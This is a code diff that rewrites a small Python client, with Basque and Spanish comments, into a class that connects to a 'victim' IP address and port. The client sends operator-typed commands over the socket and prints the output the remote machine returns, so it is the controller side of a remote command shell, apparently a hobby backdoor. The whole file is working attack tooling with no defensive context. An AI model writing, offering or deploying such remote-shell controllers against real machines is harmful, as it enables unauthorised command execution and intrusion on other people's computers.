@@ -1,23 +1,35 @@
 import socket 
 import time
 
-s = socket.socket()
-s.connect(("192.168.0.40",9999))
+
+class cliente(object):
+    def __init__(self,ip_biktima,portua):
+        self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.so.connect((ip_biktima,portua))
+    
+    def koneksioa(self):
+        while True:
+            #url
+            recibido = self.so.recv(4095)
+            url = str(recibido,encoding='utf-8')
+            #comandoa
+            mensaje = input(url + ">")
+            mensaje_b = bytes(mensaje,encoding= "utf-8")
+            self.so.send(mensaje_b)
+            #luzehera
+            lu = self.so.recv(4096)
+            #itxi
+            if mensaje == "itxi":
+                break
+            #emaitza
+            recibido = self.so.recv(int(lu))
+            print(str(recibido,encoding = 'utf-8'))
+            #ongi hartu duzula ziurtatzeko
+            self.so.send(bytes("ok",encoding = "utf-8"))
+        print("agur")
+        self.so.close()
+
+cliente = cliente("192.168.0.10",9996)
+cliente.koneksioa()
 
 
-while True:
-    recibido = s.recv(4096)
-    url = str(recibido,encoding='utf-8')
-    mensaje = input(url + ">")
-    print(mensaje)
-    mensaje_b = bytes(mensaje,encoding = "utf-8")
-    s.send(mensaje_b)
-    recibido = s.recv(4096)
-    print(str(recibido,encoding='utf-8'))
-    #recibido = s.recv(1111096)
-    #print(recibido)
-    if mensaje == "itxi":
-        break
-print ("agur")
-
-s.close()
